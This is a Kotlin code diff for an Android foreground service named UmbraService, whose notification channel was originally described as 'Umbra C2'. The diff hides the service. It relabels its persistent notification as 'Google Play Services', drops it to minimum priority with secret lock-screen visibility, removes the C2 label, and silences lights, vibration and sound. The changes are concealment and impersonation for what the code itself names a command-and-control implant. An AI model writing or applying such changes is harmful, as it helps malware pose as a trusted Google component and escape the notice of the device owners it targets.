@@ -41,12 +41,13 @@ class UmbraService : Service() {
         )
 
         val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("System Service")
-            .setContentText("Active")
+            .setContentTitle("Google Play Services")
+            .setContentText("Running")
             .setSmallIcon(android.R.drawable.ic_menu_info_details)
             .setContentIntent(pendingIntent)
             .setOngoing(true)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .build()
 
         // ── Promote to foreground IMMEDIATELY ──────────────────────────────
@@ -170,10 +171,13 @@ class UmbraService : Service() {
             val channel = NotificationChannel(
                 CHANNEL_ID,
                 "System Service",
-                NotificationManager.IMPORTANCE_LOW
+                NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = "Umbra C2"
+                description = "System Service"
                 setShowBadge(false)
+                enableLights(false)
+                enableVibration(false)
+                setSound(null, null)
             }
             val manager = getSystemService(NotificationManager::class.java)
             manager.createNotificationChannel(channel)
